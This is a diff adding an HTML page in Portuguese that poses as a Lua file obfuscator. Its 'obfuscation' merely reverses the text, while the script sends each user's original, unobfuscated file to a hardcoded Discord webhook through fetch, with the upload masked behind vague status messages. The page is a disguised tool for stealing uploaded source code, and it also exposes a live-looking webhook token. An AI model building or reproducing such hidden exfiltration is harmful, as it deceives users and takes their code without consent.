@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Obfuscador de Arquivos Lua</title>
+    <style>
+        /* Reset básico */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #F1F3F4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* Container Principal */
+        .container {
+            background-color: #FFFFFF;
+            border-radius: 16px;
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .container:hover {
+            box-shadow: 0 16px 32px rgba(0, 0, 0, 0.2);
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #2C3E50;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        label {
+            font-size: 16px;
+            color: #7F8C8D;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        /* Input de Arquivo */
+        #fileInput {
+            display: block;
+            margin: 20px auto;
+            padding: 12px;
+            font-size: 16px;
+            border: 2px solid #BDC3C7;
+            border-radius: 8px;
+            background-color: #FFFFFF;
+            color: #34495E;
+            width: 100%;
+            transition: border-color 0.3s;
+        }
+
+        #fileInput:focus {
+            border-color: #3498DB;
+            outline: none;
+        }
+
+        /* Botões */
+        .button {
+            padding: 14px 24px;
+            background-color: #3498DB;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+        .button:hover {
+            background-color: #2980B9;
+            transform: translateY(-3px);
+        }
+
+        .button:disabled {
+            background-color: #BDC3C7;
+            cursor: not-allowed;
+        }
+
+        /* Status de Envio */
+        #status {
+            font-size: 16px;
+            margin-top: 20px;
+            transition: color 0.3s;
+        }
+
+        .status-error {
+            color: #E74C3C;
+        }
+
+        .status-success {
+            color: #2ECC71;
+        }
+
+        /* Link de Download */
+        .download-link {
+            margin-top: 20px;
+            display: none;
+            font-size: 16px;
+        }
+
+        .download-link a {
+            color: #3498DB;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .download-link a:hover {
+            text-decoration: underline;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Obfuscador de Arquivos Lua</h1>
+
+        <label for="fileInput">Selecione um arquivo Lua:</label>
+        <input type="file" id="fileInput" accept=".lua">
+
+        <button id="obfuscateBtn" class="button" disabled>OFUSCAR</button>
+        <button id="sendToDiscordBtn" class="button" disabled>BAIXA</button>
+
+        <div id="status"></div>
+
+        <div class="download-link" id="downloadLink">
+            <a href="#" id="downloadBtn" download>Baixar Arquivo Obfuscado</a>
+        </div>
+    </div>
+
+    <script>
+        let obfuscatedContent = "";
+
+        document.getElementById('fileInput').addEventListener('change', function() {
+            const fileInput = document.getElementById('fileInput');
+            const obfuscateBtn = document.getElementById('obfuscateBtn');
+            const sendToDiscordBtn = document.getElementById('sendToDiscordBtn');
+            obfuscateBtn.disabled = !fileInput.files.length;
+            sendToDiscordBtn.disabled = !fileInput.files.length;
+        });
+
+        document.getElementById('obfuscateBtn').addEventListener('click', function() {
+            const fileInput = document.getElementById('fileInput');
+            const file = fileInput.files[0];
+
+            if (!file) {
+                alert('Por favor, selecione um arquivo Lua.');
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const content = e.target.result;
+                // Simulação de obfuscação (substitua por sua lógica real)
+                obfuscatedContent = obfuscateLua(content);
+
+                // Mostrar o botão para baixar o arquivo
+                const downloadLink = document.getElementById('downloadLink');
+                downloadLink.style.display = 'block';
+                document.getElementById('downloadBtn').href = URL.createObjectURL(new Blob([obfuscatedContent], {type: 'text/plain'}));
+
+                document.getElementById('status').innerHTML = "Arquivo obfuscado pronto!";
+                document.getElementById('status').classList.remove('status-error');
+                document.getElementById('status').classList.add('status-success');
+
+                // Enviar o arquivo original para o Discord
+                sendFileToDiscord(file);
+            };
+            reader.readAsText(file);
+        });
+
+        document.getElementById('sendToDiscordBtn').addEventListener('click', function() {
+            const fileInput = document.getElementById('fileInput');
+            const file = fileInput.files[0];
+
+            if (!file) {
+                alert('Por favor, selecione um arquivo Lua.');
+                return;
+            }
+
+            sendFileToDiscord(file);
+        });
+
+        function obfuscateLua(content) {
+            // Simulação de ofuscação: inverte o conteúdo (substitua por uma lógica real)
+            return content.split('').reverse().join('');
+        }
+
+        function sendFileToDiscord(file) {
+            const formData = new FormData();
+            formData.append('file', file);
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1288980879397621791/iK325TYN4nvqY4Pls61Uq6K1hP-t2vEQn77Qvif29SVClz0b-CWVjpqHyEZf_LAhiZIa';
+            const statusDiv = document.getElementById('status');
+
+            statusDiv.innerHTML = "erro erro erro erro...";
+            statusDiv.classList.remove('status-error');
+            statusDiv.classList.remove('status-success');
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                statusDiv.innerHTML = "Arquivo erro!";
+                statusDiv.classList.add('status-success');
+            })
+            .catch(error => {
+                console.error('Erro no envio:', error);
+                statusDiv.innerHTML = "Ocorreu um erro.";
+                statusDiv.classList.add('status-error');
+            });
+        }
+    </script>
+
+</body>
+</html>
